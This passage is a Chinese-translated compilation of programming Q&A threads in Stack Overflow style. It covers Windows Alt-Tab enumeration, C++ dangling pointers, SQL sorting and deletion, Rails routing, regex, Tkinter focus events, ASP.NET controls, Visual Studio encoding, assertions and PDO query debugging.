    and ( (cloaked = DWM_NOT_CLOAKED) or (cloaked = DWM_NORMAL_APP_NOT_CLOAKED) )
    and ( (LHParent=0) or (LHParent=LHDesktop) )
    and (Application.Handle<>LHWindow)
    and ((LExStyle and WS_EX_TOOLWINDOW = 0) or (LExStyle and WS_EX_APPWINDOW <> 0))
    then
    begin
      titlelen := GetWindowTextLength(LHWindow);
      SetLength(title, titlelen);
      GetWindowText(LHWindow, PChar(title), titlelen + 1);
      { add each to a list }
      But.ListBox1.Items.Add(title);
      { also add each HWND to the list too, later switch using SwitchToThisWindow }
      { ... }
    end;

  Result := True;
end; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-06-01T06:38:50.363

干得好。我的 Pascal 有点生疏，但您的解决方案很有帮助。我是新手，所以请原谅我的代码和/或表达方式。答案比较简单。

要制作 Alt-Tab 窗口列表，您似乎需要三个条件

1) 窗口必须可见 - 使用 GetWindowVisible

2) 窗口不能是工具栏窗口 - 使用 GetWindowInfo

3) 不得隐藏窗口 - 使用 DwmGetWindowAttribute

我不相信您需要查看类名。我认为 WS_EX_APPWINDOW 标志经常无法通过测试（例如 Chrome）——即使与 WS_EX_TOOLWINDOW 一起使用也是如此。另外...如果您在顶层枚举 Windows，我认为您不需要查看父 Window。

```
 public static bool IsAltTabWindow(IntPtr hWnd)
    {
        const uint WS_EX_TOOLWINDOW = 0x00000080;
        const uint DWMWA_CLOAKED = 14;

        //  It must be a visible Window
        if (!IsWindowVisible(hWnd)) return false;

        //  It must not be a Tool bar window
        WINDOWINFO winInfo = new WINDOWINFO(true);
        GetWindowInfo(hWnd, ref winInfo);            
        if ((winInfo.dwExStyle & WS_EX_TOOLWINDOW) != 0) return false;

        //  It must not be a cloaked window
        uint CloakedVal;
        DwmGetWindowAttribute(hWnd, DWMWA_CLOAKED, out CloakedVal, sizeof(uint));
        return CloakedVal == 0;
    } 
```

# c++ - 跟踪自动变量的生命周期？

> ID：210506
> 
> 赞同：1
> 
> 时间：2008-10-16T22:21:43.310
> 
> 标签：c++, scope

这可能是不可能的，但我想我会问...

有没有人可以想到在不修改变量本身的类的情况下跟踪自动变量是否已被删除？例如，考虑以下代码：

```
const char* pStringBuffer;
{
    std::string sString( "foo" );
    pStringBuffer = sString.c_str();
} 
```

显然，在块之后，pStringBuffer 是一个悬空指针，它可能有效也可能无效。我想要一种方法来拥有一个包含 pStringBuffer 的包装类（带有一个用于 const char* 的强制转换运算符），但断言它引用的变量仍然有效。通过更改引用变量的类型，我当然可以做到（例如，提升 shared_ptr/weak_ptr），但我希望能够在不对引用类型施加限制的情况下做到这一点。

一些想法：

*   我可能需要更改赋值语法以包含引用的变量（这很好）
*   我也许可以查看堆栈指针来检测我的包装类是否比引用的类“晚”分配，但这似乎很老套且不标准（C++ 没有定义堆栈行为）。不过，它可以工作。

想法/出色的解决方案？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-16T23:10:21.840

一般来说，在 C++ 中根本不可能，因为指针太“原始”。此外，查看您是否在引用的类之后分配是行不通的，因为如果您更改字符串，则 c_str 指针可能会更改。

在这种特殊情况下，您可以检查字符串是否仍然为 c_str 返回相同的值。如果是，您可能仍然有效，如果不是，那么您的指针无效。

作为调试工具，我建议使用高级内存跟踪系统，例如 valgrind（恐怕仅适用于 linux。类似的程序适用于 windows，但我相信它们都需要花钱。这个程序是我安装 linux 的唯一原因在我的 Mac 上）。以你的程序执行速度慢得多为代价，valgrind 检测你是否曾经从一个无效的指针中读取。虽然它并不完美，但我发现它可以检测到许多错误，尤其是这种类型的错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-16T23:08:08.287

您可能会发现一种有用的技术是用您自己的实现替换`new`/`delete`运算符，这些实现将使用的内存页面（由您分配的）标记`operator new`为在释放（由您的释放`operator delete`）时不可访问。您将需要确保内存页面永远不会被重复使用，但是由于内存耗尽，运行时长度会受到限制。

如果您的应用程序在释放内存页面后访问它们，如上面的示例所示，操作系统将捕获尝试的访问并引发错误。它本身并不完全跟踪，因为应用程序将立即停止，但它确实提供反馈:-)

此技术适用于狭窄的场景，不会捕获所有类型的内存滥用，但它可能很有用。希望有帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-16T23:57:28.687

您可以制作一个在您提到的简单情况下工作的包装类。也许是这样的：

```
X<const char*> pStringBuffer;
{
    std::string sString( "foo" );
    Trick trick(pStringBuffer).set(sString.c_str());
} // trick goes out of scope; its destructor marks pStringBuffer as invalid 
```

但它无助于更复杂的情况：

```
X<const char*> pStringBuffer;
{
    std::string sString( "foo" );
    {
        Trick trick(pStringBuffer).set(sString.c_str());
    } // trick goes out of scope; its destructor marks pStringBuffer as invalid
} 
```

在这里，失效发生得太快了。

大多数情况下，您应该只编写尽可能安全的代码（请参阅：智能指针），但不安全（请参阅：性能、低级接口），并使用工具（valgrind、Purify）来确保不会漏掉任何东西。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-17T10:06:20.860

鉴于“pStringBuffer”是 sString 超出范围后示例中唯一存在的部分，您需要对其进行一些更改或替代，以反映这一点。一个简单的机制是一种作用域保护，作用域匹配 sString，它在 pStringBuffer 被销毁时影响它。例如，它可以将 pStringBuffer 设置为 NULL。

要在不改变“变量”类的情况下做到这一点，只能通过多种方式完成：

*   在与 sString 相同的范围内引入一个不同的变量（为了减少冗长，您可以考虑使用宏来同时生成这两个东西）。不太好。

*   用模板 ala X sString 包装：这是否是“修改变量的类型”是有争议的……另一种观点是 sString 成为同一变量的包装器。它还受到影响，您能做的最好的事情就是让模板构造函数将参数传递给包装的构造函数，最多可以达到一些有限的 N 个参数。

这些都没有多大帮助，因为它们依赖于开发人员记住使用它们。

***更好***的方法是使“const char* pStringBuffer”简单地成为“std::string some_meaningful_name”，并根据需要分配给它。考虑到引用计数，99.99% 的时间都不会太贵。

# database - 以字符串形式存储在数据库中的订货号

> ID：210509
> 
> 赞同：1
> 
> 时间：2008-10-16T22:23:00.330
> 
> 标签：database, language-agnostic, sql-order-by

我在数据库的几个表中有一堆记录，它们有一个“进程号”字段，这基本上是一个数字，但我必须将它存储为一个字符串，因为一些遗留数据有像“89a”这样的东西number 和一些要求将流程编号表示为数字/年份的编号系统。

当我尝试按编号对流程进行排序时，就会出现问题。我得到类似的东西：

*   1
*   10
*   11
*   12

另一个问题是当我需要添加一个新进程时。新进程的编号应该是现有的最大编号加一，为此我需要一种按编号对现有记录进行排序的方法。

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-16T22:29:05.277

[也许这会有所帮助。](http://blog.feedmarker.com/2006/02/01/how-to-do-natural-alpha-numeric-sort-in-mysql/)

本质上：

```
SELECT process_order FROM your_table ORDER BY process_order + 0 ASC 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-16T22:29:35.980

您可以将数字存储为零填充值吗？也就是01、10、11、12？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-16T22:31:06.163

我建议创建一个仅用于排序的新数字字段并从触发器更新它。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-16T22:41:55.033

你能把数据分成两个字段吗？

将“进程号”存储为 int，将“进程子类型”存储为字符串。

那样：

*   您可以轻松获得 MAX processNumber - 并在需要生成新数字时增加它
*   您可以 ORDER BY processNumber ASC, processSubtype ASC - 获得正确的顺序，即使多个记录具有相同的基数并附加了不同的年份/字母
*   当您需要“完整”数字时，您可以将两个字段连接起来

那会做你需要的吗？

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-17T05:02:01.460

在我看来，您在这里有两个任务。

> • 通过传统格式将字符串转换为数字/去除垃圾
> • 对数字进行排序

如果您有一种实用的方法将字符串解析正则表达式引入您的流程（并且您的问题有足够的量值得付出努力），那么我会

> • 创建一个参考表，例如
> 
> ```
>  CREATE TABLE tblLegacyFormatRegularExpressionMaster(
>     LegacyFormatId int,
>     LegacyFormatName varchar(50),
>     RegularExpression varchar(max)
> ) 
> ```
> 
> • 然后，通过调用正则表达式的方式，例如 SQL Server 2005 及更高版本中的 CLR 集成（.NET 公共语言运行时集成，允许*从 SQL Server 中调用已编译的 .NET 方法作为普通（Microsoft 扩展）T -SQL*，那么你应该能够解决你的问题。
> 
>         • 见
> 
>           http://www.codeproject.com/KB/string/SqlRegEx.aspx

如果这对您手头的问题来说开销太大，我深表歉意。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-10-16T23:16:09.787

鉴于您的流程编号似乎没有遵循任何固定模式（根据您的问题和评论），您是否可以构建/维护一个包含两个字段的流程编号表：

```
create table process_ordering ( processNumber varchar(N), processOrder int ) 
```

然后从您的表中选择所有进程号并插入到进程号表中。根据（不同的）进程编号格式设置您想要的排序。加入此表，按 processOrder 排序并从另一个表中选择所有字段。在 processNumber 上索引此表以使连接快速。

```
select my_processes.*
from my_processes
  inner join process_ordering on my_process.processNumber = process_ordering.processNumber
order by process_ordering.processOrder 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-10-17T07:29:02.490

建议：

• 使您的列成为固定宽度的文本（即`CHAR`，而不是`VARCHAR`）。

• 用足够的前导零填充现有值以填充每列和一个尾随空格，其中值不以'a'（或其他）结尾。• 添加一个`CHECK`约束（或等效项）以确保新值符合模式，例如

```
CHECK (process_number LIKE '[0-9][0-9][0-9][0-9][0-9][0-9][ab ]') 
```

• 在您的插入/更新存储过程（或等效程序）中，填充任何传入值以适应模式。

• 在向人类显示值时，酌情删除前导/尾随零/空格。

这种方法的另一个优点是传入的值“1”、“01”、“001”等都将被视为相同的值，并且可以被 DBMS 中的简单唯一约束覆盖。

顺便说一句，我喜欢将结尾的“a”（或其他）拆分为单独的列的想法，但是我得到的印象是相关数据元素是一个标识符，因此不适合拆分它。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-16T22:39:07.753

您需要在选择时投射您的字段。我将这种语法基于 MySQL - 但想法是一样的：

```
select * from table order by cast(field AS UNSIGNED); 
```

当然，如果需要，可以签署 UNSIGNED。

# ruby-on-rails - 命名空间资源控制器中的 POST 请求将执行索引操作而不是创建

> ID：210513
> 
> 赞同：0
> 
> 时间：2008-10-16T22:24:06.520
> 
> 标签：ruby-on-rails, ruby, namespaces

我有一个用于某些管理功能的命名空间控制器。我的创建表单不起作用——它最终将请求路由到索引操作而不是创建操作。

为什么 POST 没有按应有的方式路由到创建操作（RESTful）？

路线.rb：

```
 map.namespace :admin do |admin|
    admin.resources :events
  end 
```

耙路线：

```
 admin_events GET    /admin/events                   {:action=>"index", :controller=>"admin/events"}
    formatted_admin_events GET    /admin/events.:format           {:action=>"index", :controller=>"admin/events"}
                               POST   /admin/events                   {:action=>"create", :controller=>"admin/events"}
                               POST   /admin/events.:format           {:action=>"create", :controller=>"admin/events"}
           new_admin_event GET    /admin/events/new               {:action=>"new", :controller=>"admin/events"}
 formatted_new_admin_event GET    /admin/events/new.:format       {:action=>"new", :controller=>"admin/events"}
          edit_admin_event GET    /admin/events/:id/edit          {:action=>"edit", :controller=>"admin/events"}
formatted_edit_admin_event GET    /admin/events/:id/edit.:format  {:action=>"edit", :controller=>"admin/events"}
               admin_event GET    /admin/events/:id               {:action=>"show", :controller=>"admin/events"}
     formatted_admin_event GET    /admin/events/:id.:format       {:action=>"show", :controller=>"admin/events"}
                               PUT    /admin/events/:id               {:action=>"update", :controller=>"admin/events"}
                               PUT    /admin/events/:id.:format       {:action=>"update", :controller=>"admin/events"}
                               DELETE /admin/events/:id               {:action=>"destroy", :controller=>"admin/events"}
                               DELETE /admin/events/:id.:format       {:action=>"destroy", :controller=>"admin/events"} 
```

应用程序/views/admin/events/new.html.erb：

```
<h1>New event</h1>

<% form_for([:admin, @event]) do |f| %>
  <%= f.error_messages %>
  ... 
```

应用程序/控制器/管理员/event_controller.rb：

```
class Admin::EventsController < ApplicationController
  def index
    @events = Event.find(:all)
    ...
  end

  def create
    @event = Event.new(params[:event])
    ...
  end

  ...
end 
```

最后，您可以看到它确实正在发布的一些日志文件：

```
Processing Admin::EventsController#index (for 127.0.0.1 at 2008-10-16 18:12:47) [POST]
  Session ID: ...
  Parameters: {"commit"=>"Create", "authenticity_token"=>"...", "action"=>"index", "controller"=>"admin/events", "event"=>{"location"=>""}}
  Event Load (0.000273)   SELECT * FROM `events` 
Rendering template within layouts/application
Rendering admin/events/index
Completed in 0.00757 (132 reqs/sec) | Rendering: 0.00118 (15%) | DB: 0.00027 (3%) | 200 OK [http://localhost/admin/events] 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-16T22:40:45.097

路线的顺序是问题。我不确定为什么，但是将它移到我的根路由 ( `map.connect ''`) 下可以解决问题，并且 Rails 会相应地路由请求。

# sql - 只要有超过 YY 行，sql 语句删除早于 XXX 的记录

> ID：210515
> 
> 赞同：7
> 
> 时间：2008-10-16T22:25:10.980
> 
> 标签：sql, datetime

假设一个包含以下列的表：

`pri_id`, `item_id`, `comment`,`date`

我想要的是一个 SQL 查询，它将删除任何记录，对于`item_id`比给定日期更早的特定记录，但只要有超过 15 行`item_id`。

这将用于清除项目超过 1 年的评论记录，但我仍希望在任何给定时间保留至少 15 条记录。这样，如果我在 10 年内有一条评论，它永远不会被删除，但如果我在过去 5 天内有 100 条评论，我只会保留最新的 15 条记录。对于此示例，这些当然是任意的记录计数和日期时间范围。

我想找到一种非常通用的方法，可以在 mysql、oracle、postgres 等中使用。我正在使用 phps adodb 库进行 DB 抽象，所以如果可能的话，我希望它能够很好地工作。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-16T22:33:14.067

像这样的东西应该适合你：

```
delete
from
  MyTable
where
  item_id in
  (
    select
      item_id
    from
      MyTable
    group by
      item_id
    having
      count(item_id) > 15
  )
  and
    Date < @tDate 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-16T22:41:00.480

您想始终保留至少 15 个，对吗？所以：

```
 DELETE
    FROM    CommentTable
    WHERE   CommentId NOT IN (
            SELECT  TOP 15 CommentId
            FROM    CommentTable
            WHERE   ItemId=@ItemId
            AND CommentDate < @Date
            ORDER BY CommentDate DESC
    )
    AND ItemId=@ItemId
    AND CommentDate < @Date 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-16T22:36:19.413

这是你要找的吗？

```
DELETE
    [MyTable]
WHERE
    [item_id] = 100 and
    (SELECT COUNT(*) FROM [MyTable] WHERE [item_id] = 100) > 15 
```

我是一个 MS SQL Server 人，但我认为它应该在其他地方工作。

# regex - 正则表达式多词搜索

> ID：210518
> 
> 赞同：6
> 
> 时间：2008-10-16T22:26:09.683
> 
> 标签：regex, string

我用什么来搜索字符串中的多个单词？我希望逻辑运算为 AND，以便所有单词都在字符串中的某个位置。我有一堆废话段落和一个简单的英文段落，我想通过指定几个常用词来缩小范围，例如“the”和“and”，但希望它匹配我指定的所有词。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2008-11-06T15:00:12.307

正则表达式支持“环视”条件，让您在字符串中搜索一个词，然后忘记结果的位置；从下一个搜索词的字符串开头开始。这将允许以任何顺序在字符串中搜索一组单词。

正则表达式是：

```
^(?=.*\bword1\b)(?=.*\bword2\b)(?=.*\bword3\b) 
```

where`\b`是单词边界，`?=`是环视修饰符。

如果要搜索的单词数量不定，则需要使用循环构建此正则表达式字符串 - 只需将每个单词包装在环视语法中并将其附加到表达式中即可。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-16T22:47:54.443

`AND`作为连接

```
^(?=.*?\b(?:word1)\b)(?=.*?\b(?:word2)\b)(?=.*?\b(?:word3)\b) 
```

`OR`作为交替

```
^(?=.*?\b(?:word1|word2|word3)\b
^(?=.*?\b(?:word1)\b)|^(?=.*?\b(?:word2)\b)|^(?=.*?\b(?:word3)\b) 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-10-16T22:36:15.153

首先，我不确定您要返回什么……整个句子？你给定的两个单词之间的单词？

就像是：

```
\b(word1|word2)\b(\w+\b)*(word1|word2)\b(\w+\b)*\. 
```

（`\b`您的语言中的单词边界在哪里）将匹配包含两个单词之一或两者的完整句子。

你可能需要让它不区分大小写，这样如果它出现在句子的开头它仍然会匹配

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-16T22:54:28.207

也许使用[语言识别图表](http://en.wikipedia.org/wiki/Wikipedia:Language_recognition_chart#English)来识别英语会起作用。一些快速测试似乎有效（假设段落仅由换行符分隔）。

正则表达式将匹配其中任何一个条件... \bword\b 是由边界分隔的单词 word\b 是一个单词结尾，并且仅 word 将在要匹配的段落的任何位置匹配它。

```
my @paragraphs = split(/\n/,$text);
for my $p (@paragraphs) {
    if ($p =~ m/\bthe\b|\band\b|\ban\b|\bin\b|\bon\b|\bthat\b|\bis\b|\bare\b|th|sh|ough|augh|ing\b|tion\b|ed\b|age\b|’s\b|’ve\b|n’t\b|’d\b/) {
       print "Probable english\n$p\n";
    }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-16T22:35:31.800

假设 PCRE（Perl 正则表达式），我不确定您是否可以轻松做到这一点。AND 操作是正则表达式的串联，但您希望能够排列单词出现的顺序，而不必正式生成排列。对于N个词，当N=2时，是可以忍受的；N = 3，勉强可以；当 N > 3 时，它不太可能被接受。因此，简单的迭代解决方案 - N 个正则表达式，每个单词一个，并迭代确保每个都满足 - 对我来说似乎是最佳选择。

# python - python+Tkinter中的光标事件处理

> ID：210522
> 
> 赞同：1
> 
> 时间：2008-10-16T22:29:13.467
> 
> 标签：python, tkinter, events, mouse-cursor

我正在构建一个代码，当用户将光标的焦点从一个条目小部件更改为任何地方时，我希望能够在其中生成一个事件，例如另一个条目小部件，一个按钮......

到目前为止，我只提出了绑定到 TAB 和鼠标单击的想法，尽管如果我将鼠标单击绑定到 Entry 小部件，我只会在 Entry 小部件内获得鼠标事件。

当小部件失去光标焦点​​时，如何完成生成事件？

提前致谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-10-22T13:56:48.647

<FocusIn> 和 <FocusOut> 事件是您想要的。运行以下示例，当焦点位于其中一个条目小部件中时，无论您单击还是按 Tab（或 shift-tab），您都会看到焦点输入和输出绑定。

```
from Tkinter import *

def main():
    global text

    root=Tk()

    l1=Label(root,text="Field 1:")
    l2=Label(root,text="Field 2:")
    t1=Text(root,height=4,width=40)
    e1=Entry(root)
    e2=Entry(root)
    l1.grid(row=0,column=0,sticky="e")
    e1.grid(row=0,column=1,sticky="ew")
    l2.grid(row=1,column=0,sticky="e")
    e2.grid(row=1,column=1,sticky="ew")
    t1.grid(row=2,column=0,columnspan=2,sticky="nw")

    root.grid_columnconfigure(1,weight=1)
    root.grid_rowconfigure(2,weight=1)

    root.bind_class("Entry","<FocusOut>",focusOutHandler)
    root.bind_class("Entry","<FocusIn>",focusInHandler)

    text = t1
    root.mainloop()

def focusInHandler(event):
    text.insert("end","FocusIn %s\n" % event.widget)
    text.see("end")

def focusOutHandler(event):
    text.insert("end","FocusOut %s\n" % event.widget)
    text.see("end")

if __name__ == "__main__":
    main(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-17T07:12:44.113

这不是 tkinter 特有的，也不是基于焦点的，但我在这里得到了类似问题的答案：

[使用python检测Windows中的鼠标点击](https://stackoverflow.com/questions/165495/detecting-mouse-clicks-in-windows-using-python)

我很长一段时间没有做过任何 tkinter，但似乎有“FocusIn”和“FocusOut”事件。您也许可以绑定和跟踪这些以解决您的问题。

来自： [http ://effbot.org/tkinterbook/tkinter-events-and-bindings.htm](http://effbot.org/tkinterbook/tkinter-events-and-bindings.htm)

# c# - ASP.NET 用户控件交叉通信

> ID：210541
> 
> 赞同：2
> 
> 时间：2008-10-16T22:36:32.517
> 
> 标签：c#, asp.net, vb.net, ascx

场景：2 个用户控件（foo.ascx 和 fum.ascx）

foo 有一个非常想从 fum 访问属性的方法。他们生活在同一页面上，但我找不到一种非常简单的方法来完成这种交流。

有任何想法吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-16T22:49:20.963

*   `OnMyPropertyValueChanged`在 fum.ascx 中添加一个事件。
*   将相应的 EventHandler 添加到 foo.ascx 中，它将属性值存储在私有变量中。
*   将 foo.ascx 的事件处理程序附加到 Page_Load 上的 fum.ascx 事件。
*   在 fum.ascx Page_Load 和需要时引发事件
*   让 foo.ascx 的方法使用自己的变量

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-16T23:07:01.457

有几种方法可以处理这个问题，但最好的解决方案是尽可能解耦。

最解耦的方法是递归的 findControl 方法，它遍历控件对象模型，直到找到所需的控件并返回引用。

```
private Control findControl(Control root, string id) 
{ 
    if (root.ID == id)
    { 
        return root; 
    } 

    foreach (Control c in root.Controls) 
    { 
        Control t = findControl(c, id); 
        if (t != null) 
        { 
            return t; 
        } 
    } 

    return null; 
} 
```

这是另一种很简洁的方法，虽然我不知道我是否会使用它。（有点伪代码）：

```
public FunkyUserControl : UserControl
{
    private List<UserControl> subscribedControls;

    public List<UserControl> Subscribers
    {
        get { return subscribedControls;}
    }

    public void SubscribeTo(UserControl control)
    {
        subscribedControls.Add(control);
    }
} 
```

从 FunkyUserControl 继承您的两个用户控件，然后在您的主页类中，您可以执行以下操作：

```
webControl1.SubscribeTo(webControl2);
webControl2.SubscribeTo(webControl1); 
```

现在每个控件都可以自省其订阅者集合以找到另一个控件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-16T22:38:56.957

将事件添加到与窗体挂钩的 UserControl。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-09T17:57:57.173

您可以使用`FindControl`on引用其他用户控件`Foo's Parent`。这是最简单的，您不需要在每个主（父）表单上编写任何内容。

```
'From within foo...call this code<br>
Dim objParent As Object<br>
Dim lngPropID As Long<br>

objParent = Me.Parent.FindControl("fum")<br>
lngPropID= objParent.PropID 'public property PropID on fum<br> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-16T22:57:51.023

最简单的解决方案是 fum 将一个值存储在 HttpContext.Current.Items[] 中，foo 以后可以在其中读取它。

一个更强大的选项是给 foo 一个属性，该页面可以使用对 fum 的引用来填充该属性。

一个事件是更多的工作，但在架构上更好。

# visual-studio - 使用 Visual Studio 在源代码中显示日文字体

> ID：210547
> 
> 赞同：11
> 
> 时间：2008-10-16T22:40:32.523
> 
> 标签：visual-studio

我有一些用日语写的注释的源文件。当我在 Visual Studio 中打开这些文件时，它们看起来像这样：

```
à–¾FNCAP‰¹—p‚ÌƒXƒŒƒbƒh 
```

我使用的是英文版的 WinXP，但有没有办法让 Visual Studio 显示实际的日文字符，而不是当前的随机乱码？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2015-07-06T15:05:11.890

我找到了解决问题的一般方法。这在 Visual Studio 2013 和 Windows 8.1 的中文文本中对我有用。

根据[https://msdn.microsoft.com/en-us/library/ms246590.aspx](https://msdn.microsoft.com/en-us/library/ms246590.aspx)

1.  以管理员身份单击开始，单击控制面板，然后打开区域和语言选项（或 Windows 8 中的区域）。
2.  单击高级选项卡。（或 Windows 8 中的管理）
3.  在“选择一种语言以匹配您要使用的非 Unicode 程序的语言版本”列表中，选择您当前使用的语言。
4.  单击确定。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-10-16T22:44:12.033

大概 VS 正在使用错误的编码解释文件。

使用“文件->打开->文件...->打开->打开方式...->带有编码的源代码（文本）编辑器”重新打开它并尝试各种编码。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-16T22:45:47.803

您是否为 Windows 开启了对东方语言的支持？我把它打开了，我可以在 WinXP 上的 Visual Studio 2005 中看到汉字。

要打开它，您可能需要 Windows 的安装 DVD。该设置位于控制面板中的区域和语言选项下。我认为您只需要检查“为东亚语言安装文件”选项即可。

[微软的国际化支持页面](http://www.microsoft.com/globaldev/handson/user/xpintlsupp.mspx)有一些截图和说明。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-07-10T17:44:23.303

我遇到了同样的问题，并找到了适合我的解决方案。

问题是这些文件不是 unicode 并且 VS 正在尝试使用与您的位置匹配的编码打开它们。幸运的是，您可以为非 unicode 文件设置 Windows 默认行为。查看此链接， http: [//msdn.microsoft.com/en-us/library/ms246590.aspx](http://msdn.microsoft.com/en-us/library/ms246590.aspx)。查看“正确显示当前代码页中未包含的字符”。

这些说明对于 Windows 8 是不正确的（我不能为 7 岁或更老的人说话。）对于 Windows 8：

1.  导航到控制面板
2.  选择时钟、语言和地区（是的，它们前面还有逗号和）
3.  地区
4.  行政的
5.  更改系统区域设置...
6.  从“当前系统区域设置”下拉列表中选择所需的语言

您的大多数程序应继续以英语运行，因为此设置仅在程序和文件不支持 unicode 时应用。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-09-14T01:28:26.520

我刚刚得到了这个问题并通过更改文件“setting.json”中的配置“files.encoding”来解决它。转到菜单 => 文件 => 参考 => 设置以打开文件。搜索“files.encoding”并将值更改为文件的编码（我的文件以 Shift-JIS 编码，我使用 Notpad++ 检查结束）

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-09-06T04:46:49.013

Windows 10：--> 控制面板\时钟和区域\区域

![在此处输入图像描述](https://i.stack.imgur.com/jJhXa.png) ![在此处输入图像描述](https://i.stack.imgur.com/W7b5V.png)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-08-08T14:53:37.957

您还可以使用 Notepad++ 将文本编码转换为 UTF-8。

1.  最初编码为 Shift-JIS：

    ![图像1](https://i.stack.imgur.com/sS9n2.png)

2.  转换为 UTF-8：

    ![图2](https://i.stack.imgur.com/Zkjfn.png)

3.  保存存档。

无论本地区域如何，它现在都应该正确显示。

# visual-studio - Visual Studio 启用断言

> ID：210558
> 
> 赞同：1
> 
> 时间：2008-10-16T22:44:15.717
> 
> 标签：visual-studio, assert

我正在尝试将断言语句添加到项目中，但它们一直被跳过。我需要在某处启用一个选项吗？

断言语句是：

```
Debug.Assert(false, "Deserialization failed", "Deserialization failed"); 
```

我正在调试模式下运行。我可能正在做一些愚蠢的事情；我不确定。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-16T23:57:44.617

确保已定义 DEBUG 条件编译符号。在 VS2008 中，在 Build 选项卡上项目的属性页面上：“Define DEBUG constant”。默认情况下，调试版本应该是这种情况，但它有可能被关闭。

它可以在其他 IDE 中以类似但不同的方式设置/取消设置（可能使用编辑控件而不是复选框）。

它也有可能（但不太可能）被配置文件设置禁用，无论是使用`<assert assertuienabled="false" />`设置还是因为 DefaultTraceListener 已从 Listeners 集合中删除。如果您认为这可能是正在发生的事情，请参阅 Debug.Assert() 方法的文档以获取更多详细信息。

# php - 从 PDO 准备好的语句中获取原始 SQL 查询字符串

> ID：210564
> 
> 赞同：145
> 
> 时间：2008-10-16T22:47:32.463
> 
> 标签：php, sql, mysql, pdo, pdostatement

有没有办法在准备好的语句上调用 PDOStatement::execute() 时执行原始 SQL 字符串？出于调试目的，这将非常有用。

* * *

## 回答 #1

> 赞同：117
> 
> 时间：2008-10-16T23:55:25.883

我假设您的意思是您想要最终的 SQL 查询，其中插入参数值。我知道这对调试很有用，但这不是准备好的语句的工作方式。参数不与客户端上的准备好的语句组合，因此 PDO 永远不应访问与其参数组合的查询字符串。

执行prepare() 时将SQL 语句发送到数据库服务器，执行execute() 时将单独发送参数。MySQL 的一般查询日志确实显示了最终的 SQL，其中包含在您执行 () 之后插入的值。以下是我的一般查询日志的摘录。我从 mysql CLI 而不是 PDO 运行查询，但原理是一样的。

```
081016 16:51:28 2 Query       prepare s1 from 'select * from foo where i = ?'
                2 Prepare     [2] select * from foo where i = ?
081016 16:51:39 2 Query       set @a =1
081016 16:51:47 2 Query       execute s1 using @a
                2 Execute     [2] select * from foo where i = 1 
```

如果你设置 PDO 属性 PDO::ATTR_EMULATE_PREPARES，你也可以得到你想要的。在这种模式下，PDO 将参数插入到 SQL 查询中，并在您执行（）时发送整个查询。 **这不是一个真正的准备好的查询。** 您将通过在执行（）之前将变量插入 SQL 字符串来规避准备查询的好处。

* * *

来自@afilina 的重新评论：

不，文本 SQL 查询在执行期间*不*与参数组合。因此，PDO 没有任何东西可以向您展示。

在内部，如果您使用 PDO::ATTR_EMULATE_PREPARES，PDO 会复制 SQL 查询并将参数值插入其中，然后再进行准备和执行。但是 PDO 不会公开这个修改后的 SQL 查询。

PDOStatement 对象有一个属性 $queryString，但这仅在 PDOStatement 的构造函数中设置，并且在使用参数重写查询时不会更新。

PDO 要求他们公开重写的查询将是一个合理的功能请求。但即使这样也不会给你“完整”的查询，除非你使用 PDO::ATTR_EMULATE_PREPARES。

这就是为什么我在上面展示了使用 MySQL 服务器的通用查询日志的解决方法，因为在这种情况下，即使是带有参数占位符的准备好的查询也会在服务器上重写，参数值会回填到查询字符串中。但这仅在记录期间完成，而不是在查询执行期间完成。

* * *

## 回答 #2

> 赞同：110
> 
> 时间：2009-09-04T01:41:32.663

```
/**
 * Replaces any parameter placeholders in a query with the value of that
 * parameter. Useful for debugging. Assumes anonymous parameters from 
 * $params are are in the same order as specified in $query
 *
 * @param string $query The sql query with parameter placeholders
 * @param array $params The array of substitution parameters
 * @return string The interpolated query
 */
public static function interpolateQuery($query, $params) {
    $keys = array();

    # build a regular expression for each parameter
    foreach ($params as $key => $value) {
        if (is_string($key)) {
            $keys[] = '/:'.$key.'/';
        } else {
            $keys[] = '/[?]/';
        }
    }

    $query = preg_replace($keys, $params, $query, 1, $count);

    #trigger_error('replaced '.$count.' keys');

    return $query;
} 
```

* * *

## 回答 #3

> 赞同：34
> 
> 时间：2011-12-06T16:16:55.113

我修改了该方法以包括处理 WHERE IN (?) 等语句的数组输出。

